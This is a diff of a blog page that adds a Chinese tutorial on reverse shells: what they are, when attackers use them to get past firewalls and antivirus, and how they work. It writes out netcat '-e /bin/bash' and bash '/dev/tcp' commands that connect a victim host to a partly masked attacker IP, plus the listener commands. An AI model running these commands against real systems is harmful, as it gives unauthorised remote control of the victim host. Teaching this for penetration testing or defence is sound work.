@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>about | Secfeng</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="about | Secfeng">
+  <title>反弹shell | Secfeng</title>
+  <meta name="keywords" content=" shell ">
+  <meta name="description" content="反弹shell | Secfeng">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="一、含义​	客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端） 二、适用情况​	1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求 ​	2、目标机端口被占用 ​	3、目标机位于局域网 ​	4、IP会动态变化 ​	5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd&#x2F;">
 <meta property="og:type" content="article">
@@ -508,24 +508,31 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="about-" class="article article-type-about" itemscope itemprop="blogPost">
+        <article id="post-反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">about</h1>
+        <h1 class="article-title">反弹shell</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">shell</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-28 22:09:40'>2023-03-05 19:53</time>
+            发布时间 : <time class="date" title='最后更新: 2024-02-26 21:33:47'>2024-02-26 19:29</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:0</span>
+        <span>字数:738</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -544,7 +551,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%90%AB%E4%B9%89"><span class="toc-text">一、含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%82%E7%94%A8%E6%83%85%E5%86%B5"><span class="toc-text">二、适用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-text">三、原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%B9%E5%BC%8F"><span class="toc-text">四、方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81linux%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1、linux反弹shell</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -560,7 +567,70 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="一、含义"><a href="#一、含义" class="headerlink" title="一、含义"></a>一、含义</h3><p>​	客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端）</p>
+<h3 id="二、适用情况"><a href="#二、适用情况" class="headerlink" title="二、适用情况"></a>二、适用情况</h3><p>​	1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求</p>
+<p>​	2、目标机端口被占用</p>
+<p>​	3、目标机位于局域网</p>
+<p>​	4、IP会动态变化</p>
+<p>​	5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd&#x2F;bash命令</p>
+<p>​	6、遇到各种AV（AntiVirus，杀软）对正向的连接数据包检测，对出网的检测不严格</p>
+<h3 id="三、原理"><a href="#三、原理" class="headerlink" title="三、原理"></a>三、原理</h3><p>​	1.攻击者A开启19111端口TCP服务</p>
+<p>​	2.受害者B连接19111端口TCP服务</p>
+<p>​	3.A、B建立TCP连接</p>
+<p>​	4.A通过TCP服务将待执行命令发送到B</p>
+<p>​	5.B执行命令后将结果发送给A</p>
+<h3 id="四、方式"><a href="#四、方式" class="headerlink" title="四、方式"></a>四、方式</h3><h4 id="1、linux反弹shell"><a href="#1、linux反弹shell" class="headerlink" title="1、linux反弹shell"></a>1、linux反弹shell</h4><p>（1）netcat反弹shell</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre><code>netcat -lvvp 2333
+</code></pre>
+<p><code>-l</code>: 表示 <code>listen</code> 模式，即使 <code>netcat</code> 以服务器的方式监听连接请求。</p>
+<p><code>-v</code>: 表示 <code>verbose</code> 模式，使 <code>netcat</code> 在执行时显示更多详细信息。（<code>-v</code>: 显示基本的信息。<code>-vv</code>: 显示更详细的信息。<code>-vvv</code>: 显示更加详细和详尽的信息。）</p>
+<p><code>-p 2333</code>: 表示使用指定的端口号，这里是端口号 2333。<code>-p</code> 选项用于指定端口。</p>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre><code>netcat 47.xxx.xxx.72 2333 -e /bin/bash
+# nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
+</code></pre>
+<p>​	整个命令的作用是，<code>netcat</code> 将连接到指定的目标主机（IP地址或主机名为 <code>47.xxx.xxx.72</code>），连接到指定的端口（端口号为 <code>2333</code>），然后在成功连接后，在目标主机（攻击机）上启动一个 Bash shell。这就创建了一个远程 shell 连接，使得用户可以在目标主机上执行命令。</p>
+<p>执行效果如下：</p>
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/201908.png" class="">
+
+<img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/202030.png" class="">
+
+<p>仿佛不能成功执行cd命令。。。</p>
+<p>（2）利用bash反弹shell</p>
+<p><strong>攻击机开启本地监听</strong>：</p>
+<pre><code>netcat -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1
+或bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;
+# bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>表示以交互模式启动 Bash，即允许用户与 shell 进行交互。</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>表示将标准输出和标准错误重定向到指定的位置。</td>
+</tr>
+<tr>
+<td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td>
+<td>Linux环境中所有的内容都是以文件的形式存在的。在这里，它表示将 Bash 的标准输出和标准错误重定向到指定 IP 地址（<code>47.xxx.xxx.72</code>）和端口号（<code>2333</code>），让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
